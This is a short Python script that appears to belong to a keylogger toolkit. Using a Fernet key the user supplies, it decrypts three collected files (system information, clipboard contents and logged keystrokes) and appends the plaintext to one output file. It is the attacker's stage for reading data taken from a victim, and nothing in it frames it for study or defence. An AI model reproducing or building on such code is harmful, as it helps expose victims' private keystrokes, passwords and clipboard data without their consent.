from cryptography.fernet import Fernet

key = " " # Enter your encryption key here

system_information_e = 'e_system.txt' # Decrypts the Encrypted System Configuration related Data
clipboard_information_e = 'e_clipboard.txt' # Decrypts the Encrypted Clipboard Data
keys_information_e = 'e_keys_logged.txt' # Decrypts the Encrypted Keylogged Data

encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
count = 0

for decrypting_files in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("decryption.txt", 'ab') as f:
        f.write(decrypted)

    count += 1
